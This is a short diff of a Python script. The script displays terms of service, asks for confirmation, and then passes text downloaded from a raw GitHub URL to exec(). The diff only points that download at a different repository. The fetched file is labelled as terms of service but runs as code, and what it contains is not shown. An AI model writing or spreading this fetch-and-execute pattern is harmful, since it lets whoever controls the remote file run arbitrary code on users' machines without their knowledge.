@@ -52,4 +52,4 @@ os.system('cls')
 print(TOS2)
 confirm()
 if True:
-    exec(requests.get('https://raw.githubusercontent.com/MCCFree/TOS/main/Terms%20of%20Services2').text)
+    exec(requests.get('https://raw.githubusercontent.com/zcharo99/MCC-Linux-TOS/main/Terms%20of%20Services2').text)
